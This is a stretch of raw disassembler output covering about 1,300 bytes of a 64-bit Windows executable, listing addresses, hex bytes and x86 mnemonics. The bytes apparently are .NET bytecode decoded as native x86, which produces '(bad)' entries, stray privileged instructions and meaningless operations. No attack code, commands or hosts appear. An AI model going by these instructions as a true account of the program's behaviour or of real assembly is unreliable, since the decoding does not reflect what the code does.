   140005b0f:	4c 12 07             	rex.WR adc (%rdi),%r8b
   140005b12:	4c 59                	rex.WR pop %rcx
   140005b14:	28 ce                	sub    %cl,%dh
   140005b16:	00 00                	add    %al,(%rax)
   140005b18:	06                   	(bad)
   140005b19:	07                   	(bad)
   140005b1a:	13 04 de             	adc    (%rsi,%rbx,8),%eax
   140005b1d:	0e                   	(bad)
   140005b1e:	fe 06                	incb   (%rsi)
   140005b20:	22 00                	and    (%rax),%al
   140005b22:	00 06                	add    %al,(%rsi)
   140005b24:	12 07                	adc    (%rdi),%al
   140005b26:	28 7d 00             	sub    %bh,0x0(%rbp)
   140005b29:	00 06                	add    %al,(%rsi)
   140005b2b:	dc 12                	fcoml  (%rdx)
   140005b2d:	07                   	(bad)
   140005b2e:	28 37                	sub    %dh,(%rdi)
   140005b30:	00 00                	add    %al,(%rax)
   140005b32:	06                   	(bad)
   140005b33:	de 0e                	fimuls (%rsi)
   140005b35:	fe 06                	incb   (%rsi)
   140005b37:	24 00                	and    $0x0,%al
   140005b39:	00 06                	add    %al,(%rsi)
   140005b3b:	12 08                	adc    (%rax),%cl
   140005b3d:	28 7d 00             	sub    %bh,0x0(%rbp)
   140005b40:	00 06                	add    %al,(%rsi)
   140005b42:	dc 12                	fcoml  (%rdx)
   140005b44:	08 28                	or     %ch,(%rax)
   140005b46:	38 00                	cmp    %al,(%rax)
   140005b48:	00 06                	add    %al,(%rsi)
   140005b4a:	11 04 2a             	adc    %eax,(%rdx,%rbp,1)
   140005b4d:	00 00                	add    %al,(%rax)
   140005b4f:	00 41 34             	add    %al,0x34(%rcx)
   140005b52:	00 00                	add    %al,(%rax)
   140005b54:	04 00                	add    $0x0,%al
   140005b56:	00 00                	add    %al,(%rax)
   140005b58:	8f 00                	pop    (%rax)
   140005b5a:	00 00                	add    %al,(%rax)
   140005b5c:	17                   	(bad)
   140005b5d:	00 00                	add    %al,(%rax)
   140005b5f:	00 a6 00 00 00 0e    	add    %ah,0xe000000(%rsi)
   140005b65:	00 00                	add    %al,(%rax)
   140005b67:	00 3b                	add    %bh,(%rbx)
   140005b69:	00 00                	add    %al,(%rax)
   140005b6b:	01 04 00             	add    %eax,(%rax,%rax,1)
   140005b6e:	00 00                	add    %al,(%rax)
   140005b70:	0b 00                	or     (%rax),%eax
   140005b72:	00 00                	add    %al,(%rax)
   140005b74:	b2 00                	mov    $0x0,%dl
   140005b76:	00 00                	add    %al,(%rax)
   140005b78:	bd 00 00 00 0e       	mov    $0xe000000,%ebp
   140005b7d:	00 00                	add    %al,(%rax)
   140005b7f:	00 3b                	add    %bh,(%rbx)
   140005b81:	00 00                	add    %al,(%rax)
   140005b83:	01 03                	add    %eax,(%rbx)
   140005b85:	30 02                	xor    %al,(%rdx)
   140005b87:	00 03                	add    %al,(%rbx)
   140005b89:	01 00                	add    %eax,(%rax)
   140005b8b:	00 2d 00 00 11 28    	add    %ch,0x28110000(%rip)        # 0x168115b91
   140005b91:	16                   	(bad)
   140005b92:	00 00                	add    %al,(%rax)
   140005b94:	06                   	(bad)
   140005b95:	2d 02 15 2a 7e       	sub    $0x7e2a1502,%eax
   140005b9a:	41 00 00             	add    %al,(%r8)
   140005b9d:	04 28                	add    $0x28,%al
   140005b9f:	f7 00 00 06 2d 02    	testl  $0x22d0600,(%rax)
   140005ba5:	15 2a 28 1d 00       	adc    $0x1d282a,%eax
   140005baa:	00 06                	add    %al,(%rsi)
   140005bac:	28 19                	sub    %bl,(%rcx)
   140005bae:	00 00                	add    %al,(%rax)
   140005bb0:	06                   	(bad)
   140005bb1:	28 18                	sub    %bl,(%rax)
   140005bb3:	00 00                	add    %al,(%rax)
   140005bb5:	06                   	(bad)
   140005bb6:	0d 09 2d 02 15       	or     $0x15022d09,%eax
   140005bbb:	2a 09                	sub    (%rcx),%cl
   140005bbd:	28 cf                	sub    %cl,%bh
   140005bbf:	00 00                	add    %al,(%rax)
   140005bc1:	06                   	(bad)
   140005bc2:	0a 06                	or     (%rsi),%al
   140005bc4:	2d 02 15 2a 28       	sub    $0x282a1502,%eax
   140005bc9:	1d 00 00 06 28       	sbb    $0x28060000,%eax
   140005bce:	19 00                	sbb    %eax,(%rax)
   140005bd0:	00 06                	add    %al,(%rsi)
   140005bd2:	16                   	(bad)
   140005bd3:	6a 0c                	push   $0xc
   140005bd5:	06                   	(bad)
   140005bd6:	12 02                	adc    (%rdx),%al
   140005bd8:	28 20                	sub    %ah,(%rax)
   140005bda:	00 00                	add    %al,(%rax)
   140005bdc:	06                   	(bad)
   140005bdd:	80 2e 00             	subb   $0x0,(%rsi)
   140005be0:	00 04 7e             	add    %al,(%rsi,%rdi,2)
   140005be3:	2e 00 00             	cs add %al,(%rax)
   140005be6:	04 39                	add    $0x39,%al
   140005be8:	9e                   	sahf
   140005be9:	00 00                	add    %al,(%rax)
   140005beb:	00 08                	add    %cl,(%rax)
   140005bed:	39 98 00 00 00 28    	cmp    %ebx,0x28000000(%rax)
   140005bf3:	1d 00 00 06 28       	sbb    $0x28060000,%eax
   140005bf8:	19 00                	sbb    %eax,(%rax)
   140005bfa:	00 06                	add    %al,(%rsi)
   140005bfc:	06                   	(bad)
   140005bfd:	08 28                	or     %ch,(%rax)
   140005bff:	d0 00                	rolb   $1,(%rax)
   140005c01:	00 06                	add    %al,(%rsi)
   140005c03:	0b 07                	or     (%rdi),%eax
   140005c05:	2d 38 7e 4e 00       	sub    $0x4e7e38,%eax
   140005c0a:	00 04 28             	add    %al,(%rax,%rbp,1)
   140005c0d:	cd 00                	int    $0x0
   140005c0f:	00 06                	add    %al,(%rsi)
   140005c11:	26 7e 3f             	es jle 0x140005c53
   140005c14:	00 00                	add    %al,(%rax)
   140005c16:	04 2c                	add    $0x2c,%al
   140005c18:	0b 7e 3f             	or     0x3f(%rsi),%edi
   140005c1b:	00 00                	add    %al,(%rax)
   140005c1d:	04 28                	add    $0x28,%al
   140005c1f:	d7                   	xlat   (%rbx)
   140005c20:	00 00                	add    %al,(%rax)
   140005c22:	06                   	(bad)
   140005c23:	26 7e 51             	es jle 0x140005c77
   140005c26:	00 00                	add    %al,(%rax)
   140005c28:	04 2c                	add    $0x2c,%al
   140005c2a:	0b 7e 51             	or     0x51(%rsi),%edi
   140005c2d:	00 00                	add    %al,(%rax)
   140005c2f:	04 28                	add    $0x28,%al
   140005c31:	d7                   	xlat   (%rbx)
   140005c32:	00 00                	add    %al,(%rax)
   140005c34:	06                   	(bad)
   140005c35:	26 06                	es (bad)
   140005c37:	28 d7                	sub    %dl,%bh
   140005c39:	00 00                	add    %al,(%rax)
   140005c3b:	06                   	(bad)
   140005c3c:	26 15 2a 07 20 e8    	es adc $0xe820072a,%eax
   140005c42:	03 00                	add    (%rax),%eax
   140005c44:	00 28                	add    %ch,(%rax)
   140005c46:	de 00                	fiadds (%rax)
   140005c48:	00 06                	add    %al,(%rsi)
   140005c4a:	26 07                	es (bad)
   140005c4c:	28 d7                	sub    %dl,%bh
   140005c4e:	00 00                	add    %al,(%rax)
   140005c50:	06                   	(bad)
   140005c51:	26 7e 4e             	es jle 0x140005ca2
   140005c54:	00 00                	add    %al,(%rax)
   140005c56:	04 28                	add    $0x28,%al
   140005c58:	cd 00                	int    $0x0
   140005c5a:	00 06                	add    %al,(%rsi)
   140005c5c:	26 7e 3f             	es jle 0x140005c9e
   140005c5f:	00 00                	add    %al,(%rax)
   140005c61:	04 2c                	add    $0x2c,%al
   140005c63:	0b 7e 3f             	or     0x3f(%rsi),%edi
   140005c66:	00 00                	add    %al,(%rax)
   140005c68:	04 28                	add    $0x28,%al
   140005c6a:	d7                   	xlat   (%rbx)
   140005c6b:	00 00                	add    %al,(%rax)
   140005c6d:	06                   	(bad)
   140005c6e:	26 7e 51             	es jle 0x140005cc2
   140005c71:	00 00                	add    %al,(%rax)
   140005c73:	04 2c                	add    $0x2c,%al
   140005c75:	0b 7e 51             	or     0x51(%rsi),%edi
   140005c78:	00 00                	add    %al,(%rax)
   140005c7a:	04 28                	add    $0x28,%al
   140005c7c:	d7                   	xlat   (%rbx)
   140005c7d:	00 00                	add    %al,(%rax)
   140005c7f:	06                   	(bad)
   140005c80:	26 06                	es (bad)
   140005c82:	28 d7                	sub    %dl,%bh
   140005c84:	00 00                	add    %al,(%rax)
   140005c86:	06                   	(bad)
   140005c87:	26 16                	es (bad)
   140005c89:	2a 06                	sub    (%rsi),%al
   140005c8b:	28 d7                	sub    %dl,%bh
   140005c8d:	00 00                	add    %al,(%rax)
   140005c8f:	06                   	(bad)
   140005c90:	26 15 2a cc 03 30    	es adc $0x3003cc2a,%eax
   140005c96:	04 00                	add    $0x0,%al
   140005c98:	51                   	push   %rcx
   140005c99:	00 00                	add    %al,(%rax)
   140005c9b:	00 01                	add    %al,(%rcx)
   140005c9d:	00 00                	add    %al,(%rax)
   140005c9f:	11 03                	adc    %eax,(%rbx)
   140005ca1:	18 5f 2c             	sbb    %bl,0x2c(%rdi)
   140005ca4:	2c 02                	sub    $0x2,%al
   140005ca6:	1e                   	(bad)
   140005ca7:	6a 59                	push   $0x59
   140005ca9:	0a 02                	or     (%rdx),%al
   140005cab:	1f                   	(bad)
   140005cac:	18 6a 06             	sbb    %ch,0x6(%rdx)
   140005caf:	4c fe 06             	rex.WR incb (%rsi)
   140005cb2:	01 00                	add    %eax,(%rax)
   140005cb4:	00 06                	add    %al,(%rsi)
   140005cb6:	28 7e 00             	sub    %bh,0x0(%rsi)
   140005cb9:	00 06                	add    %al,(%rsi)
   140005cbb:	03 17                	add    (%rdi),%edx
   140005cbd:	5f                   	pop    %rdi
   140005cbe:	2c 0f                	sub    $0xf,%al
   140005cc0:	06                   	(bad)
   140005cc1:	25 4c 1f 18 6a       	and    $0x6a181f4c,%eax
   140005cc6:	5a                   	pop    %rdx
   140005cc7:	1e                   	(bad)
   140005cc8:	6a 58                	push   $0x58
   140005cca:	28 e8                	sub    %ch,%al
   140005ccc:	00 00                	add    %al,(%rax)
   140005cce:	06                   	(bad)
   140005ccf:	06                   	(bad)
   140005cd0:	2a 02                	sub    (%rdx),%al
   140005cd2:	7f 43                	jg     0x140005d17
   140005cd4:	00 00                	add    %al,(%rax)
   140005cd6:	04 55                	add    $0x55,%al
   140005cd8:	02 1e                	add    (%rsi),%bl
   140005cda:	6a 58                	push   $0x58
   140005cdc:	28 e9                	sub    %ch,%cl
   140005cde:	00 00                	add    %al,(%rax)
   140005ce0:	06                   	(bad)
   140005ce1:	03 17                	add    (%rdi),%edx
   140005ce3:	5f                   	pop    %rdi
   140005ce4:	2c 09                	sub    $0x9,%al
   140005ce6:	02 1f                	add    (%rdi),%bl
   140005ce8:	18 6a 28             	sbb    %ch,0x28(%rdx)
   140005ceb:	da 00                	fiaddl (%rax)
   140005ced:	00 06                	add    %al,(%rsi)
   140005cef:	02 2a                	add    (%rdx),%ch
   140005cf1:	00 00                	add    %al,(%rax)
   140005cf3:	00 03                	add    %al,(%rbx)
   140005cf5:	30 04 00             	xor    %al,(%rax,%rax,1)
   140005cf8:	51                   	push   %rcx
   140005cf9:	00 00                	add    %al,(%rax)
   140005cfb:	00 02                	add    %al,(%rdx)
   140005cfd:	00 00                	add    %al,(%rax)
   140005cff:	11 03                	adc    %eax,(%rbx)
   140005d01:	18 5f 2c             	sbb    %bl,0x2c(%rdi)
   140005d04:	2c 02                	sub    $0x2,%al
   140005d06:	1e                   	(bad)
   140005d07:	6a 59                	push   $0x59
   140005d09:	0a 02                	or     (%rdx),%al
   140005d0b:	1f                   	(bad)
   140005d0c:	18 6a 06             	sbb    %ch,0x6(%rdx)
   140005d0f:	4c fe 06             	rex.WR incb (%rsi)
   140005d12:	05 00 00 06 28       	add    $0x28060000,%eax
   140005d17:	7e 00                	jle    0x140005d19
   140005d19:	00 06                	add    %al,(%rsi)
   140005d1b:	03 17                	add    (%rdi),%edx
   140005d1d:	5f                   	pop    %rdi
   140005d1e:	2c 0f                	sub    $0xf,%al
   140005d20:	06                   	(bad)
   140005d21:	25 4c 1f 18 6a       	and    $0x6a181f4c,%eax
   140005d26:	5a                   	pop    %rdx
   140005d27:	1e                   	(bad)
   140005d28:	6a 58                	push   $0x58
   140005d2a:	28 e8                	sub    %ch,%al
   140005d2c:	00 00                	add    %al,(%rax)
   140005d2e:	06                   	(bad)
   140005d2f:	06                   	(bad)
   140005d30:	2a 02                	sub    (%rdx),%al
   140005d32:	7f 43                	jg     0x140005d77
   140005d34:	00 00                	add    %al,(%rax)
   140005d36:	04 55                	add    $0x55,%al
   140005d38:	02 1e                	add    (%rsi),%bl
   140005d3a:	6a 58                	push   $0x58
   140005d3c:	28 e9                	sub    %ch,%cl
   140005d3e:	00 00                	add    %al,(%rax)
   140005d40:	06                   	(bad)
   140005d41:	03 17                	add    (%rdi),%edx
   140005d43:	5f                   	pop    %rdi
   140005d44:	2c 09                	sub    $0x9,%al
   140005d46:	02 1f                	add    (%rdi),%bl
   140005d48:	18 6a 28             	sbb    %ch,0x28(%rdx)
   140005d4b:	da 00                	fiaddl (%rax)
   140005d4d:	00 06                	add    %al,(%rsi)
   140005d4f:	02 2a                	add    (%rdx),%ch
   140005d51:	00 00                	add    %al,(%rax)
   140005d53:	00 03                	add    %al,(%rbx)
   140005d55:	30 04 00             	xor    %al,(%rax,%rax,1)
   140005d58:	51                   	push   %rcx
   140005d59:	00 00                	add    %al,(%rax)
   140005d5b:	00 2e                	add    %ch,(%rsi)
   140005d5d:	00 00                	add    %al,(%rax)
   140005d5f:	11 03                	adc    %eax,(%rbx)
   140005d61:	18 5f 2c             	sbb    %bl,0x2c(%rdi)
   140005d64:	2c 02                	sub    $0x2,%al
   140005d66:	1e                   	(bad)
   140005d67:	6a 59                	push   $0x59
   140005d69:	0a 02                	or     (%rdx),%al
   140005d6b:	1f                   	(bad)
   140005d6c:	18 6a 06             	sbb    %ch,0x6(%rdx)
   140005d6f:	4c fe 06             	rex.WR incb (%rsi)
   140005d72:	08 00                	or     %al,(%rax)
   140005d74:	00 06                	add    %al,(%rsi)
   140005d76:	28 7e 00             	sub    %bh,0x0(%rsi)
   140005d79:	00 06                	add    %al,(%rsi)
   140005d7b:	03 17                	add    (%rdi),%edx
   140005d7d:	5f                   	pop    %rdi
   140005d7e:	2c 0f                	sub    $0xf,%al
   140005d80:	06                   	(bad)
   140005d81:	25 4c 1f 18 6a       	and    $0x6a181f4c,%eax
   140005d86:	5a                   	pop    %rdx
   140005d87:	1e                   	(bad)
   140005d88:	6a 58                	push   $0x58
   140005d8a:	28 e8                	sub    %ch,%al
   140005d8c:	00 00                	add    %al,(%rax)
   140005d8e:	06                   	(bad)
   140005d8f:	06                   	(bad)
   140005d90:	2a 02                	sub    (%rdx),%al
   140005d92:	7f 43                	jg     0x140005dd7
   140005d94:	00 00                	add    %al,(%rax)
   140005d96:	04 55                	add    $0x55,%al
   140005d98:	02 1e                	add    (%rsi),%bl
   140005d9a:	6a 58                	push   $0x58
   140005d9c:	28 e9                	sub    %ch,%cl
   140005d9e:	00 00                	add    %al,(%rax)
   140005da0:	06                   	(bad)
   140005da1:	03 17                	add    (%rdi),%edx
   140005da3:	5f                   	pop    %rdi
   140005da4:	2c 09                	sub    $0x9,%al
   140005da6:	02 1f                	add    (%rdi),%bl
   140005da8:	18 6a 28             	sbb    %ch,0x28(%rdx)
   140005dab:	da 00                	fiaddl (%rax)
   140005dad:	00 06                	add    %al,(%rsi)
   140005daf:	02 2a                	add    (%rdx),%ch
   140005db1:	00 00                	add    %al,(%rax)
   140005db3:	00 03                	add    %al,(%rbx)
   140005db5:	30 03                	xor    %al,(%rbx)
   140005db7:	00 0b                	add    %cl,(%rbx)
   140005db9:	00 00                	add    %al,(%rax)
   140005dbb:	00 00                	add    %al,(%rax)
   140005dbd:	00 00                	add    %al,(%rax)
   140005dbf:	00 02                	add    %al,(%rdx)
   140005dc1:	4c 02 1e             	rex.WR add (%rsi),%r11b
   140005dc4:	6a 58                	push   $0x58
   140005dc6:	4c fe 01             	rex.WR incb (%rcx)
   140005dc9:	d2 2a                	shrb   %cl,(%rdx)
   140005dcb:	cc                   	int3
   140005dcc:	03 30                	add    (%rax),%esi
   140005dce:	03 00                	add    (%rax),%eax
   140005dd0:	0f 00 00             	sldt   (%rax)
   140005dd3:	00 2f                	add    %ch,(%rdi)
   140005dd5:	00 00                	add    %al,(%rax)
   140005dd7:	11 02                	adc    %eax,(%rdx)
   140005dd9:	12 00                	adc    (%rax),%al
   140005ddb:	03 28                	add    (%rax),%ebp
   140005ddd:	34 00                	xor    $0x0,%al
   140005ddf:	00 06                	add    %al,(%rsi)
   140005de1:	4c 1f                	rex.WR (bad)
   140005de3:	40 6a 58             	rex push $0x58
   140005de6:	2a cc                	sub    %ah,%cl
   140005de8:	0b 30                	or     (%rax),%esi
   140005dea:	06                   	(bad)
   140005deb:	00 83 00 00 00 30    	add    %al,0x30000000(%rbx)
   140005df1:	00 00                	add    %al,(%rax)
   140005df3:	11 02                	adc    %eax,(%rdx)
   140005df5:	12 05 04 28 46 00    	adc    0x462804(%rip),%al        # 0x1404685ff
   140005dfb:	00 06                	add    %al,(%rsi)
   140005dfd:	26 02 12             	es add (%rdx),%dl
   140005e00:	05 1f 10 58 4c       	add    $0x4c58101f,%eax
   140005e05:	04 28                	add    $0x28,%al
   140005e07:	47 00 00             	rex.RXB add %r8b,(%r8)
   140005e0a:	06                   	(bad)
   140005e0b:	2c 10                	sub    $0x10,%al
   140005e0d:	03 12                	add    (%rdx),%edx
   140005e0f:	05 1f 10 58 4c       	add    $0x4c58101f,%eax
   140005e14:	55                   	push   %rbp
   140005e15:	03 1e                	add    (%rsi),%ebx
   140005e17:	6a 58                	push   $0x58
   140005e19:	16                   	(bad)
   140005e1a:	52                   	push   %rdx
   140005e1b:	03 2a                	add    (%rdx),%ebp
   140005e1d:	02 28                	add    (%rax),%ch
   140005e1f:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140005e22:	06                   	(bad)
   140005e23:	12 04 04             	adc    (%rsp,%rax,1),%al
   140005e26:	55                   	push   %rbp
   140005e27:	12 03                	adc    (%rbx),%al
   140005e29:	02 25 4c 7f 49 00    	add    0x497f4c(%rip),%ah        # 0x14049dd7b
   140005e2f:	00 04 12             	add    %al,(%rdx,%rdx,1)
   140005e32:	04 12                	add    $0x12,%al
   140005e34:	02 28                	add    (%rax),%ch
   140005e36:	48 00 00             	rex.W add %al,(%rax)
   140005e39:	06                   	(bad)
   140005e3a:	0a 06                	or     (%rsi),%al
   140005e3c:	1e                   	(bad)
   140005e3d:	6a 58                	push   $0x58
   140005e3f:	4c 0b 06             	or     (%rsi),%r8
   140005e42:	1e                   	(bad)
   140005e43:	6a 58                	push   $0x58
   140005e45:	16                   	(bad)
   140005e46:	6a 55                	push   $0x55
   140005e48:	de 0e                	fimuls (%rsi)
   140005e4a:	fe 06                	incb   (%rsi)
   140005e4c:	4b 00 00             	rex.WXB add %al,(%r8)
   140005e4f:	06                   	(bad)
   140005e50:	12 03                	adc    (%rbx),%al
   140005e52:	28 7d 00             	sub    %bh,0x0(%rbp)
   140005e55:	00 06                	add    %al,(%rsi)
   140005e57:	dc 12                	fcoml  (%rdx)
   140005e59:	03 28                	add    (%rax),%ebp
   140005e5b:	4b 00 00             	rex.WXB add %al,(%r8)
   140005e5e:	06                   	(bad)
   140005e5f:	03 02                	add    (%rdx),%eax
   140005e61:	12 05 71 1d 00 00    	adc    0x1d71(%rip),%al        # 0x140007bd8
   140005e67:	02 07                	add    (%rdi),%al
   140005e69:	28 4d 00             	sub    %cl,0x0(%rbp)
   140005e6c:	00 06                	add    %al,(%rsi)
   140005e6e:	55                   	push   %rbp
   140005e6f:	03 1e                	add    (%rsi),%ebx
   140005e71:	6a 58                	push   $0x58
   140005e73:	17                   	(bad)
   140005e74:	52                   	push   %rdx
   140005e75:	03 2a                	add    (%rdx),%ebp
   140005e77:	00 41 1c             	add    %al,0x1c(%rcx)
   140005e7a:	00 00                	add    %al,(%rax)
   140005e7c:	04 00                	add    $0x0,%al
   140005e7e:	00 00                	add    %al,(%rax)
   140005e80:	47 00 00             	rex.RXB add %r8b,(%r8)
   140005e83:	00 0f                	add    %cl,(%rdi)
   140005e85:	00 00                	add    %al,(%rax)
   140005e87:	00 56 00             	add    %dl,0x0(%rsi)
   140005e8a:	00 00                	add    %al,(%rax)
   140005e8c:	0e                   	(bad)
   140005e8d:	00 00                	add    %al,(%rax)
   140005e8f:	00 3b                	add    %bh,(%rbx)
   140005e91:	00 00                	add    %al,(%rax)
   140005e93:	01 03                	add    %eax,(%rbx)
   140005e95:	30 02                	xor    %al,(%rdx)
   140005e97:	00 15 00 00 00 18    	add    %dl,0x18000000(%rip)        # 0x158005e9d
   140005e9d:	00 00                	add    %al,(%rax)
   140005e9f:	11 02                	adc    %eax,(%rdx)
   140005ea1:	1e                   	(bad)
   140005ea2:	6a 58                	push   $0x58
   140005ea4:	4c 0a 02             	rex.WR or (%rdx),%r8b
   140005ea7:	28 69 00             	sub    %ch,0x0(%rcx)
   140005eaa:	00 06                	add    %al,(%rsi)
   140005eac:	06                   	(bad)
   140005ead:	33 05 28 0c 00 00    	xor    0xc28(%rip),%eax        # 0x140006adb
   140005eb3:	06                   	(bad)
   140005eb4:	2a cc                	sub    %ah,%cl
   140005eb6:	cc                   	int3
   140005eb7:	cc                   	int3
   140005eb8:	03 30                	add    (%rax),%esi
   140005eba:	01 00                	add    %eax,(%rax)
   140005ebc:	0b 00                	or     (%rax),%eax
   140005ebe:	00 00                	add    %al,(%rax)
   140005ec0:	00 00                	add    %al,(%rax)
   140005ec2:	00 00                	add    %al,(%rax)
   140005ec4:	7f 04                	jg     0x140005eca
   140005ec6:	00 00                	add    %al,(%rax)
   140005ec8:	04 28                	add    $0x28,%al
   140005eca:	df 00                	filds  (%rax)
   140005ecc:	00 06                	add    %al,(%rsi)
   140005ece:	2a cc                	sub    %ah,%cl
   140005ed0:	03 30                	add    (%rax),%esi
   140005ed2:	01 00                	add    %eax,(%rax)
   140005ed4:	0a 00                	or     (%rax),%al
   140005ed6:	00 00                	add    %al,(%rax)
   140005ed8:	00 00                	add    %al,(%rax)
   140005eda:	00 00                	add    %al,(%rax)
   140005edc:	21 ba e8 a2 8b 2e    	and    %edi,0x2e8ba2e8(%rdx)
   140005ee2:	ba e8 02 2a cc       	mov    $0xcc2a02e8,%edx
   140005ee7:	cc                   	int3
   140005ee8:	03 30                	add    (%rax),%esi
   140005eea:	03 00                	add    (%rax),%eax
   140005eec:	8e 01                	mov    (%rcx),%es
   140005eee:	00 00                	add    %al,(%rax)
   140005ef0:	31 00                	xor    %eax,(%rax)
   140005ef2:	00 11                	add    %dl,(%rcx)
   140005ef4:	02 1e                	add    (%rsi),%bl
   140005ef6:	6a 58                	push   $0x58
   140005ef8:	02 1e                	add    (%rsi),%bl
   140005efa:	6a 58                	push   $0x58
   140005efc:	4c 17                	rex.WR (bad)
   140005efe:	6a 58                	push   $0x58
   140005f00:	55                   	push   %rbp
   140005f01:	02 4c 0b 04          	add    0x4(%rbx,%rcx,1),%cl
   140005f05:	1e                   	(bad)
   140005f06:	6a 58                	push   $0x58
   140005f08:	0f 01 4c 55 0f       	sidt   0xf(%rbp,%rdx,2)
   140005f0d:	01 4c 07 33          	add    %ecx,0x33(%rdi,%rax,1)
   140005f11:	19 07                	sbb    %eax,(%rdi)
   140005f13:	04 55                	add    $0x55,%al
   140005f15:	07                   	(bad)
   140005f16:	1e                   	(bad)
   140005f17:	6a 58                	push   $0x58
   140005f19:	04 55                	add    $0x55,%al
   140005f1b:	07                   	(bad)
   140005f1c:	1f                   	(bad)
   140005f1d:	10 6a 58             	adc    %ch,0x58(%rdx)
   140005f20:	04 55                	add    $0x55,%al
   140005f22:	04 1f                	add    $0x1f,%al
   140005f24:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140005f27:	17                   	(bad)
   140005f28:	52                   	push   %rdx
   140005f29:	04 2a                	add    $0x2a,%al
   140005f2b:	0f 01 1e             	lidt   (%rsi)
   140005f2e:	58                   	pop    %rax
   140005f2f:	4a 2d 1d 0f 01 4c    	rex.WX sub $0x4c010f1d,%rax
   140005f35:	1f                   	(bad)
   140005f36:	10 6a 58             	adc    %ch,0x58(%rdx)
   140005f39:	04 55                	add    $0x55,%al
   140005f3b:	0f 01 4c 07 1f       	sidt   0x1f(%rdi,%rax,1)
   140005f40:	10 6a 58             	adc    %ch,0x58(%rdx)
   140005f43:	4c 33 18             	xor    (%rax),%r11
   140005f46:	07                   	(bad)
   140005f47:	1f                   	(bad)
   140005f48:	10 6a 58             	adc    %ch,0x58(%rdx)
   140005f4b:	04 55                	add    $0x55,%al
   140005f4d:	2b 0f                	sub    (%rdi),%ecx
   140005f4f:	0f 01 4c 04 55       	sidt   0x55(%rsp,%rax,1)
   140005f54:	0f 01 4c 07 4c       	sidt   0x4c(%rdi,%rax,1)
   140005f59:	33 03                	xor    (%rbx),%eax
   140005f5b:	07                   	(bad)
   140005f5c:	04 55                	add    $0x55,%al
   140005f5e:	04 0a                	add    $0xa,%al
   140005f60:	04 1e                	add    $0x1e,%al
   140005f62:	6a 58                	push   $0x58
   140005f64:	4c 1f                	rex.WR (bad)
   140005f66:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140005f69:	46 3a 06             	rex.RX cmp (%rsi),%r8b
   140005f6c:	01 00                	add    %eax,(%rax)
   140005f6e:	00 06                	add    %al,(%rsi)
   140005f70:	1e                   	(bad)
   140005f71:	6a 58                	push   $0x58
   140005f73:	0d 09 4c 0c 08       	or     $0x80c4c09,%eax
   140005f78:	1e                   	(bad)
   140005f79:	6a 58                	push   $0x58
   140005f7b:	4c 13 07             	adc    (%rdi),%r8
   140005f7e:	11 07                	adc    %eax,(%rdi)
   140005f80:	4c 13 06             	adc    (%rsi),%r8
   140005f83:	08 11                	or     %dl,(%rcx)
   140005f85:	06                   	(bad)
   140005f86:	33 76 11             	xor    0x11(%rsi),%esi
   140005f89:	07                   	(bad)
   140005f8a:	1f                   	(bad)
   140005f8b:	10 6a 58             	adc    %ch,0x58(%rdx)
   140005f8e:	4c 13 05 11 05 1f 18 	adc    0x181f0511(%rip),%r8        # 0x1581f64a6
   140005f95:	6a 58                	push   $0x58
   140005f97:	46 2d 27 08 1f 18    	rex.RX sub $0x181f0827,%eax
   140005f9d:	6a 58                	push   $0x58
   140005f9f:	17                   	(bad)
   140005fa0:	52                   	push   %rdx
   140005fa1:	11 05 1f 18 6a 58    	adc    %eax,0x586a181f(%rip)        # 0x1986a77c6
   140005fa7:	17                   	(bad)
   140005fa8:	52                   	push   %rdx
   140005fa9:	09 4c 1e 6a          	or     %ecx,0x6a(%rsi,%rbx,1)
   140005fad:	58                   	pop    %rax
   140005fae:	4c 1f                	rex.WR (bad)
   140005fb0:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140005fb3:	16                   	(bad)
   140005fb4:	52                   	push   %rdx
   140005fb5:	09 4c 1e 6a          	or     %ecx,0x6a(%rsi,%rbx,1)
   140005fb9:	58                   	pop    %rax
   140005fba:	4c 0a 38             	rex.WR or (%rax),%r15b
   140005fbd:	a5                   	movsl  (%rsi),(%rdi)
   140005fbe:	00 00                	add    %al,(%rax)
   140005fc0:	00 06                	add    %al,(%rsi)
   140005fc2:	08 1f                	or     %bl,(%rdi)
   140005fc4:	10 6a 58             	adc    %ch,0x58(%rdx)
   140005fc7:	4c 33 09             	xor    (%rcx),%r9
   140005fca:	08 0a                	or     %cl,(%rdx)
   140005fcc:	02 06                	add    (%rsi),%al
   140005fce:	28 68 00             	sub    %ch,0x0(%rax)
   140005fd1:	00 06                	add    %al,(%rsi)
   140005fd3:	06                   	(bad)
   140005fd4:	1e                   	(bad)
   140005fd5:	6a 58                	push   $0x58
   140005fd7:	4c 1f                	rex.WR (bad)
   140005fd9:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140005fdc:	17                   	(bad)
   140005fdd:	52                   	push   %rdx
   140005fde:	06                   	(bad)
   140005fdf:	1e                   	(bad)
   140005fe0:	6a 58                	push   $0x58
   140005fe2:	4c 1e                	rex.WR (bad)
   140005fe4:	6a 58                	push   $0x58
   140005fe6:	4c 1f                	rex.WR (bad)
   140005fe8:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140005feb:	16                   	(bad)
   140005fec:	52                   	push   %rdx
   140005fed:	02 06                	add    (%rsi),%al
   140005fef:	1e                   	(bad)
   140005ff0:	6a 58                	push   $0x58
   140005ff2:	4c 1e                	rex.WR (bad)
   140005ff4:	6a 58                	push   $0x58
   140005ff6:	4c 28 67 00          	rex.WR sub %r12b,0x0(%rdi)
   140005ffa:	00 06                	add    %al,(%rsi)
   140005ffc:	2b 68 11             	sub    0x11(%rax),%ebp
   140005fff:	06                   	(bad)
   140006000:	13 04 11             	adc    (%rcx,%rdx,1),%eax
   140006003:	04 1f                	add    $0x1f,%al
   140006005:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140006008:	46 2d 24 08 1f 18    	rex.RX sub $0x181f0824,%eax
   14000600e:	6a 58                	push   $0x58
   140006010:	17                   	(bad)
   140006011:	52                   	push   %rdx
   140006012:	11 04 1f             	adc    %eax,(%rdi,%rbx,1)
   140006015:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140006018:	17                   	(bad)
   140006019:	52                   	push   %rdx
   14000601a:	09 4c 1e 6a          	or     %ecx,0x6a(%rsi,%rbx,1)
   14000601e:	58                   	pop    %rax
   14000601f:	4c 1f                	rex.WR (bad)
   140006021:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140006024:	16                   	(bad)
   140006025:	52                   	push   %rdx
   140006026:	09 4c 1e 6a          	or     %ecx,0x6a(%rsi,%rbx,1)
   14000602a:	58                   	pop    %rax
